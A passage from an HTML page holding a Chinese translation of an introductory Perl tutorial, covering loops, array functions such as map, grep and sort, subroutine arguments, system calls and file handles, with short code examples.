class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach my $i ( 0 .. $#array ) &#123;</span><br><span class="line">print $i, &quot;: &quot;, $array[$i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你无法迭代一个hash，而你可以迭代它所有的键。使用内置函数<code>keys</code>来取得包含这个hash所有键的array，然后使用<code>foreach</code>来遍历它：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach my $key (keys %scientists) &#123;</span><br><span class="line">print $key, &quot;: &quot;, $scientists&#123;$key&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为hash没有既定的次序，键可能以任何次序返回，使用内置函数<code>sort</code>事先对包含键的array进行字母序排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach my $key (sort keys %scientists) &#123;</span><br><span class="line">print $key, &quot;: &quot;, $scientists&#123;$key&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你没有显示指定迭代器，Perl将使用默认迭代器<code>$_</code>。<code>$_</code>是第一个也是最友好的一个<a href="http://perldoc.perl.org/perlvar.html" target="_blank" rel="noopener">内置变量</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach ( @array ) &#123;</span><br><span class="line">print $_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用默认迭代器，并且你希望在循环里只放一句语句，你可以使用下面这种超级简洁的语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print $_ foreach @array;</span><br></pre></td></tr></table></figure><h4 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h4><p><code>next</code>和<code>last</code>可以用来控制循环过程，在其他大部分编程语言中分别相当于<code>continue</code>和<code>break</code>。一般约定，行标写成<strong>全部大写</strong>。在循环里加上行标以后，<code>next</code>和<code>last</code>可以选择指定跳转到某个行标。下面的示例程序能够找出100以内的素数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CANDIDATE: for my $candidate ( 2 .. 100 ) &#123;</span><br><span class="line">for my $divisor ( 2 .. sqrt $candidate ) &#123;</span><br><span class="line">next CANDIDATE if $candidate % $divisor &#x3D;&#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">print $candidate.&quot; is prime\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Array函数"><a href="#Array函数" class="headerlink" title="Array函数"></a>Array函数</h3><h4 id="原地（In-place）array修改函数"><a href="#原地（In-place）array修改函数" class="headerlink" title="原地（In-place）array修改函数"></a>原地（In-place）array修改函数</h4><p>我们用<code>@stack</code>来演示这些函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my @stack &#x3D; (&quot;Fred&quot;, &quot;Eileen&quot;, &quot;Denise&quot;, &quot;Charlie&quot;);</span><br><span class="line">print @stack; # &quot;FredEileenDeniseCharlie&quot;</span><br></pre></td></tr></table></figure><p><code>pop</code>抽取并返回array的最后一个元素，可以认为是栈顶的元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print pop @stack; # &quot;Charlie&quot;</span><br><span class="line">print @stack;     # &quot;FredEileenDenise&quot;</span><br></pre></td></tr></table></figure><p><code>push</code>向array末尾添加一个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push @stack, &quot;Bob&quot;, &quot;Alice&quot;;</span><br><span class="line">print @stack; # &quot;FredEileenDeniseBobAlice&quot;</span><br></pre></td></tr></table></figure><p><code>shift</code>抽取并返回array的第一个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print shift @stack; # &quot;Fred&quot;</span><br><span class="line">print @stack;       # &quot;EileenDeniseBobAlice&quot;</span><br></pre></td></tr></table></figure><p><code>unshift</code>向array的头部插入一个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unshift @stack, &quot;Hank&quot;, &quot;Grace&quot;;</span><br><span class="line">print @stack; # &quot;HankGraceEileenDeniseBobAlice&quot;</span><br></pre></td></tr></table></figure><p><code>pop</code>、<code>push</code>、<code>shift</code>和<code>unshift</code>都是<code>splice</code>的特例。<code>splice</code>返回删除的一个array的切片，并且用另一个array的切片在原array中替换之：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print splice(@stack, 1, 4, &quot;&lt;&lt;&lt;&quot;, &quot;&gt;&gt;&gt;&quot;); # &quot;GraceEileenDeniseBob&quot;</span><br><span class="line">print @stack;                             # &quot;Hank&lt;&lt;&lt;&gt;&gt;&gt;Alice&quot;</span><br></pre></td></tr></table></figure><h4 id="从现有的array创建新的array"><a href="#从现有的array创建新的array" class="headerlink" title="从现有的array创建新的array"></a>从现有的array创建新的array</h4><p>Perl提供下面这些函数，可以操作现有的array产生新的array。</p><p><code>join</code>函数把多个字符串连接成一个字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my @elements &#x3D; (&quot;Antimony&quot;, &quot;Arsenic&quot;, &quot;Aluminum&quot;, &quot;Selenium&quot;);</span><br><span class="line">print @elements;             # &quot;AntimonyArsenicAluminumSelenium&quot;</span><br><span class="line">print &quot;@elements&quot;;           # &quot;Antimony Arsenic Aluminum Selenium&quot;</span><br><span class="line">print join(&quot;, &quot;, @elements); # &quot;Antimony, Arsenic, Aluminum, Selenium&quot;</span><br></pre></td></tr></table></figure><p>在列表上下文，<code>reverse</code>函数把传入的列表逆序返回，在scalar上下文，<code>reverse</code>先把字符串列表连接起来，再将这个字符串反转。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print reverse(&quot;Hello&quot;, &quot;World&quot;);        # &quot;WorldHello&quot;</span><br><span class="line">print reverse(&quot;HelloWorld&quot;);            # &quot;HelloWorld&quot;</span><br><span class="line">print scalar reverse(&quot;HelloWorld&quot;);     # &quot;dlroWolleH&quot;</span><br><span class="line">print scalar reverse(&quot;Hello&quot;, &quot;World&quot;); # &quot;dlroWolleH&quot;</span><br></pre></td></tr></table></figure><p><code>map</code>函数接受一个array，并将一个操作应用于这个array中的每一个scalar <code>$_</code>，然后返回用这些scalar创建的array。这个操作用在花括号中的一个表达式来表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my @capitals &#x3D; (&quot;Baton Rouge&quot;, &quot;Indianapolis&quot;, &quot;Columbus&quot;, &quot;Montgomery&quot;, &quot;Helena&quot;, &quot;Denver&quot;, &quot;Boise&quot;);</span><br><span class="line"></span><br><span class="line">print join &quot;, &quot;, map &#123; uc $_ &#125; @capitals;</span><br><span class="line"># &quot;BATON ROUGE, INDIANAPOLIS, COLUMBUS, MONTGOMERY, HELENA, DENVER, BOISE&quot;</span><br></pre></td></tr></table></figure><p><code>grep</code>函数接受一个array，并返回一个经过筛选的array。语法与<code>map</code>类似，而第二个参数会对array中的每个scalar <code>$_</code>求值，如果返回true，这个scalar就会被放到输出array中，否则就不会。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print join &quot;, &quot;, grep &#123; length $_ &#x3D;&#x3D; 6 &#125; @capitals;</span><br><span class="line"># &quot;Helena, Denver&quot;</span><br></pre></td></tr></table></figure><p>显然，返回的array长度是<em>满足条件的元素个数</em>，这就意味着你可以用<code>grep</code>检查array中是否包含某个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print scalar grep &#123; $_ eq &quot;Columbus&quot; &#125; @capitals; # &quot;1&quot;</span><br></pre></td></tr></table></figure><p><code>grep</code>和<code>map</code>的组合形成了*<a href="https://en.wikipedia.org/wiki/List_comprehension" target="_blank" rel="noopener">list comprehensions</a>*这种许多其他语言中欠缺的非常强大特性。（译者注：list comprehensions大致的意思是利用map和filter从现有的列表构造新的列表，表达的含义是对一个列表中满足某个条件的所有元素上应用某个操作，而形成一个新的列表。）</p><p>默认情况下，<code>sort</code>函数对输入的array按字母序进行排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my @elevations &#x3D; (19, 1, 2, 100, 3, 98, 100, 1056);</span><br><span class="line"></span><br><span class="line">print join &quot;, &quot;, sort @elevations;</span><br><span class="line"># &quot;1, 100, 100, 1056, 19, 2, 3, 98&quot;</span><br></pre></td></tr></table></figure><p>然而，与<code>grep</code>和<code>map</code>类似，排序总是通过一系列元素的两两比较来进行的。你的代码块接受<code>$a</code>和<code>$b</code>作为输入，如果<code>$a</code>“小于”<code>$b</code>则返回-1，如果“相等”则返回0，而如果<code>$a</code>“大于”<code>$b</code>则返回1。</p><p><code>cmp</code>运算符适用于字符串（译者注：按字母序比较）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print join &quot;, &quot;, sort &#123; $a cmp $b &#125; @elevations;</span><br><span class="line"># &quot;1, 100, 100, 1056, 19, 2, 3, 98&quot;</span><br></pre></td></tr></table></figure><p>这个“宇宙飞船运算符”<code>&lt;=&gt;</code>适用于数值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print join &quot;, &quot;, sort &#123; $a &lt;&#x3D;&gt; $b &#125; @elevations;</span><br><span class="line"># &quot;1, 2, 3, 19, 98, 100, 100, 1056&quot;</span><br></pre></td></tr></table></figure><p><code>$a</code>和<code>$b</code>总是scalar，但是它们也许是某个复杂对象的引用，那样就很难直接进行比较。如果你需要更多篇幅来描述这种比较，你可以单独创建一个子程序来描述它，并在用到它的地方提供这个子程序的名字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub comparator &#123;</span><br><span class="line"># lots of code...</span><br><span class="line"># return -1, 0 or 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print join &quot;, &quot;, sort comparator @elevations;</span><br></pre></td></tr></table></figure><p>不过你不能对<code>grep</code>或<code>map</code>这样做。</p><p>请注意，我们从来没有显式提供<code>$a</code>和<code>$b</code>给子程序和语句块。就像<code>$_</code>一样，<code>$a</code>和<code>$b</code>实际上是当一对值需要比较时被<em>填入</em>的全局变量。</p><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>截止目前你已经看到过不少内置函数了：<code>print</code>、<code>sort</code>、<code>map</code>、<code>grep</code>、<code>keys</code>、<code>scalar</code>等等。内置函数是Perl的一大优势，它们：</p><ul><li>数不胜数</li><li>非常实用</li><li>有<a href="http://perldoc.perl.org/perlfunc.html" target="_blank" rel="noopener">全面的文档支持</a></li><li>语法上差异很大，因此使用前请先查文档</li><li>有时接受正则表达式作为参数</li><li>有时接受一整块代码作为参数</li><li>有时参数之间不需要逗号分隔</li><li>有时消耗任意数量由逗号分隔的参数，有时则不时</li><li>有时在提供的参数不足的情况下会填入默认值</li><li>通常不要求参数列表用括号包围，除非会产生歧义</li></ul><p>关于内置函数最好的建议是<strong>知道它们的存在</strong>，浏览一下文档以供将来参考。如果你在完成某个任务并且发现那工作太底层也太常用了，以至于你觉得别人肯定已经做过多次了，那么事实往往的确如此。</p><h3 id="用户自定义的子程序"><a href="#用户自定义的子程序" class="headerlink" title="用户自定义的子程序"></a>用户自定义的子程序</h3><p>子程序用<code>sub</code>关键字来声明。相比内置函数，自定义子程序总是接受一种输入：一个scalar的列表。当然这个列表可以只包含一个元素，甚至为空。一个scalar会被转换成包含一个scalar的列表来处理，而一个有N个元素的hash会被转换成包含2N个元素的列表来处理。</p><p>尽管括号可以省略，我们还是应该总是在调用子程序的时候加上括号，即使不提供任何参数，读者就能更容易发现子程序的调用。</p><p>在子程序中，参数被保存在<a href="http://perldoc.perl.org/perlvar.html" target="_blank" rel="noopener">内置array变量</a><code>@_</code>中。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sub hyphenate &#123;</span><br><span class="line"></span><br><span class="line">  # 从array中取出第一个参数，忽略其他</span><br><span class="line">  my $word &#x3D; shift @_;</span><br><span class="line"></span><br><span class="line">  # 聪明过头的list comprehension</span><br><span class="line">  $word &#x3D; join &quot;-&quot;, map &#123; substr $word, $_, 1 &#125; (0 .. (length $word) - 1);</span><br><span class="line">  return $word;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print hyphenate(&quot;exterminate&quot;); # &quot;e-x-t-e-r-m-i-n-a-t-e&quot;</span><br></pre></td></tr></table></figure><h4 id="Perl以引用方式调用"><a href="#Perl以引用方式调用" class="headerlink" title="Perl以引用方式调用"></a>Perl以引用方式调用</h4><p>不像其他主流编程语言，Perl以引用方式调用子程序（译者注：以引用方式传递参数）。这意味着子程序中用到的变量或值不是实参的副本，它们<em>本身就是</em>实参。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">my $x &#x3D; 7;</span><br><span class="line"></span><br><span class="line">sub reassign &#123;</span><br><span class="line">  $_[0] &#x3D; 42;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reassign($x);</span><br><span class="line">print $x; # &quot;42&quot;</span><br></pre></td></tr></table></figure><p>如果你尝试这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reassign(8);</span><br></pre></td></tr></table></figure><p>程序就会因为错误而终止运行，因为<code>reassign()</code>的第一行就相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8 &#x3D; 42;</span><br></pre></td></tr></table></figure><p>这显然是非常荒谬的。</p><p>这边可以学到的经验教训是，在子程序中你总是应该在使用参数之前将它们提取出来。</p><h4 id="提取参数"><a href="#提取参数" class="headerlink" title="提取参数"></a>提取参数</h4><p>我们有不止一种方法来提取<code>@_</code>中的参数，但总有一些方法比其他方法更好。</p><p>下面的示例子程序<code>left_pad</code>在字符串左边填充某个字符直到达到需要的长度。（<code>x</code>函数将同一个字符串的多个副本连接起来。）（注意：为了简化问题，这些子程序都缺乏必要的错误检查，比如确保填充字符串长度为1，检查要求的宽度是否大于等于字符串的长度，需要的参数是否都提供了。）</p><p><code>left_pad</code>通常就像下面这样调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print left_pad(&quot;hello&quot;, 10, &quot;+&quot;); # &quot;+++++hello&quot;</span><br></pre></td></tr></table></figure><ol><li><p>逐个抽取<code>@_</code>中的参数很有效，但也并不是那么地美观：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub left_pad &#123;</span><br><span class="line">my $oldString &#x3D; $_[0];</span><br><span class="line">my $width     &#x3D; $_[1];</span><br><span class="line">my $padChar   &#x3D; $_[2];</span><br><span class="line">my $newString &#x3D; ($padChar x ($width - length $oldString)) . $oldString;</span><br><span class="line">return $newString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对于不超过4个参数的情况推荐用<code>shift</code>通过移出元素的方法来提取<code>@_</code>中的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub left_pad &#123;</span><br><span class="line">my $oldString &#x3D; shift @_;</span><br><span class="line">my $width     &#x3D; shift @_;</span><br><span class="line">my $padChar   &#x3D; shift @_;</span><br><span class="line">my $newString &#x3D; ($padChar x ($width - length $oldString)) . $oldString;</span><br><span class="line">return $newString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有给<code>shift</code>函数提供array参数，它就会默认对<code>@_</code>进行操作。这种用法很常见：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub left_pad &#123;</span><br><span class="line">my $oldString &#x3D; shift;</span><br><span class="line">my $width     &#x3D; shift;</span><br><span class="line">my $padChar   &#x3D; shift;</span><br><span class="line">my $newString &#x3D; ($padChar x ($width - length $oldString)) . $oldString;</span><br><span class="line">return $newString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>超过4个参数以后就很难搞清楚参数的哪部分被赋值给谁了。</p></li><li><p>你也可以一次性把所有<code>@_</code>中的参数提取出来。仍然是适用于少于4个参数的情形：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub left_pad &#123;</span><br><span class="line">my ($oldString, $width, $padChar) &#x3D; @_;</span><br><span class="line">my $newString &#x3D; ($padChar x ($width - length $oldString)) . $oldString;</span><br><span class="line">return $newString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对于有大量参数的子程序，或者有些参数可选或无法和其他参数组合使用的子程序，最佳实践是要求用户构造参数的hash来调用这个子程序，然后将整个<code>@_</code>放回到一个hash中。用这种方法，我们子程序的调用会看起来会有点不一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print left_pad(&quot;oldString&quot; &#x3D;&gt; &quot;pod&quot;, &quot;width&quot; &#x3D;&gt; 10, &quot;padChar&quot; &#x3D;&gt; &quot;+&quot;);</span><br></pre></td></tr></table></figure><p>而子程序自身就变成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub left_pad &#123;</span><br><span class="line">my %args &#x3D; @_;</span><br><span class="line">my $newString &#x3D; ($args&#123;&quot;padChar&quot;&#125; x ($args&#123;&quot;width&quot;&#125; - length $args&#123;&quot;oldString&quot;&#125;)) . $args&#123;&quot;oldString&quot;&#125;;</span><br><span class="line">return $newString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>就像其他Perl表达式一样，子程序调用也会根据上下文表现出不同的行为。你可以用<code>wantarray</code>函数（也许我们应该叫它<code>wantlist</code>（译者注：上下文可以是scalar或者列表，不是一个array或者hash），不过不要在意这些细节）来检测子程序是在什么上下文中被调用的，这样就可以返回恰当类型的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub contextualSubroutine &#123;</span><br><span class="line"># 调用这里需要一个列表，那么就返回一个列表</span><br><span class="line">return (&quot;Everest&quot;, &quot;K2&quot;, &quot;Etna&quot;) if wantarray;</span><br><span class="line"></span><br><span class="line"># 调用者需要一个scalar，那么就返回一个scalar</span><br><span class="line">return 3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">my @array &#x3D; contextualSubroutine();</span><br><span class="line">print @array; # &quot;EverestK2Etna&quot;</span><br><span class="line"></span><br><span class="line">my $scalar &#x3D; contextualSubroutine();</span><br><span class="line">print $scalar; # &quot;3&quot;</span><br></pre></td></tr></table></figure><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>如果你已经知道下面说的这些和Perl无关的事实，那抱歉我还是要多说几句。每当一个进程在Windows或Linux系统（以及其他大部分的系统）中结束，它将产生一个16位的<em>状态字</em>，高8位表示<em>返回码</em>，值落在0到255之间，其中0约定俗成地表示无条件的成功，而其他值则表示不同程度的失败，另外8位则少有人关心，它们“表示了错误的原因，比如因为收到了信号或者产生core dump信息”。</p><p>你可以调用<code>exit</code>，用你选择的返回码（0到255之间）退出Perl脚本。</p><p>Perl提供了不止一种方法通过一句调用语句来启动一个子进程、等待子进程执行结束、然后继续解释执行当前的脚本。无论用那种方法，你会发现紧接着，子进程结束时返回的状态字已经被填入了<a href="http://perldoc.perl.org/perlvar.html" target="_blank" rel="noopener">内置scalar变量</a><code>$?</code>中。你可以通过取出16位中的高8位来得到返回码：<code>$? &gt;&gt; 8</code>。</p><p>我们可以用<code>system</code>函数调用另一个程序，并且提供一个参数列表，<code>system</code>的返回值与填入<code>$?</code>的值一致：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $rc &#x3D; system &quot;perl&quot;, &quot;anotherscript.pl&quot;, &quot;foo&quot;, &quot;bar&quot;, &quot;baz&quot;;</span><br><span class="line">$rc &gt;&gt;&#x3D; 8;</span><br><span class="line">print $rc; # &quot;37&quot;</span><br></pre></td></tr></table></figure><p>另一种选择，我们也可以用反引号````在命令行中运行一条真正的命令，并且捕获它的标准输出。在scalar上下文中，整个输出被当做一整个字符串返回返回，而在列表上下文中，整个输出按一个字符串的array返回，其中每个字符串是输出中的一行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my $text &#x3D; &#96;perl anotherscript.pl foo bar baz&#96;;</span><br><span class="line">print $text; # &quot;foobarbaz&quot;</span><br></pre></td></tr></table></figure><p>如果<code>anotherscript.pl</code>包含形如下面这样的代码，你就能看到上面这种结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">print @ARGV;</span><br><span class="line">exit 37;</span><br></pre></td></tr></table></figure><h3 id="文件和文件句柄"><a href="#文件和文件句柄" class="headerlink" title="文件和文件句柄"></a>文件和文件句柄</h3><p>Scalar变量除了能够包含数值、字符串、引用或者<code>undef</code>，还能包含一个<em>文件句柄</em>。文件句柄本质上就是对于某个文件中某个位置的引用。</p><p>用<code>open</code>可以把一个scalar变量编程文件句柄。我们必须给<code>open</code>提供一个<em>打开模式</em>。模式<code>&lt;</code>表示我们想要读取这个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my $f &#x3D; &quot;text.txt&quot;;</span><br><span class="line">my $result &#x3D; open my $fh, &quot;&lt;&quot;, $f;</span><br><span class="line"></span><br><span class="line">if(!$result) &#123;</span><br><span class="line">die &quot;Couldn&#39;t open &#39;&quot;.$f.&quot;&#39; for reading because: &quot;.$!;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果成功，<code>open</code>返回true，否则返回false，并且错误消息会被填入内置变量<code>$!</code>。就像你在上面的代码里看到的，你总是应该检查<code>open</code>操作是否成功完成了，不过像那样检查真是冗长乏味，更常见的写法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(my $fh, &quot;&lt;&quot;, $f) || die &quot;Couldn&#39;t open &#39;&quot;.$f.&quot;&#39; for reading because: &quot;.$!;</span><br></pre></td></tr></table></figure><p>注意，你需要在<code>open</code>的参数列表两边加上括号。</p><p>要从文件句柄中读取一行，可以用内置函数<code>readline</code>，<code>readline</code>返回一整行文本，并且结尾有一个换行符（除了文件末尾的那行可能例外），如果已经读到文件末尾则返回<code>undef</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while(1) &#123;</span><br><span class="line">my $line &#x3D; readline $fh;</span><br><span class="line">last unless defined $line;</span><br><span class="line"># 处理$line...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用<code>chomp</code>移除末尾可能存在的换行符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomp $line;</span><br></pre></td></tr></table></figure><p>请注意，<code>chomp</code>直接作用于<code>$line</code>上，因此<code>$line = chomp $line</code>可能不会得到你想要的东西。</p><p>你也可以用<code>eof</code>来检测是否已经读到文件末尾：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while(!eof $fh) &#123;</span><br><span class="line">my $line &#x3D; readline $fh;</span><br><span class="line"># 处理$line...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过使用<code>while(my $line = readline $fh)</code>的时候要小心了，因为如果<code>$line</code>的内容恰好是<code>&quot;0&quot;</code>，循环可能过早结束。如果你想要这样写，Perl提供了<code>&lt;&gt;</code>功能上更安全的运算符，你可以用它包围<code>readline</code>。这种写法很常见而且也非常安全：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while(my $line &#x3D; &lt;$fh&gt;) &#123;</span><br><span class="line"># 处理$line...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>甚至：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while(&lt;$fh&gt;) &#123;</span><br><span class="line"># 处理$_...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要写一个文件，首先你需要另一种打开模式。模式<code>&gt;</code>表示我们想要写入这个文件。（如果目标文件存在的话，<code>&gt;</code>会清空它，如果你只是想附加在文件的原有内容后面，你应该用模式<code>&gt;&gt;</code>。）然后，将文件句柄作为<code>print</code>方法的第0个参数提供就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(my $fh2, &quot;&gt;&quot;, $f) || die &quot;Couldn&#39;t open &#39;&quot;.$f.&quot;&#39; for writing because: &quot;.$!;</span><br><span class="line">print $fh2 &quot;The eagles have left the nest&quot;;</span><br></pre></td></tr></table></figure><p>请注意在<code>$fh2</code>和后面的参数之间没有逗号。</p><p>文件句柄在超出它们的作用域以后会自动关闭，如果你想主动关闭：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close $fh2;</span><br><span class="line">close $fh;</span><br></pre></td></tr></table></figure><p>有三个文件句柄以全局常量形式存在：<code>STDIN</code>、<code>STDOUT</code>和<code>STDERR</code>，它们在脚本开始时就被自动打开。要读取一行用户的输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my $line &#x3D; &lt;STDIN&gt;;</span><br></pre></td></tr></table></figure><p>如果只是等待用户按回车：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 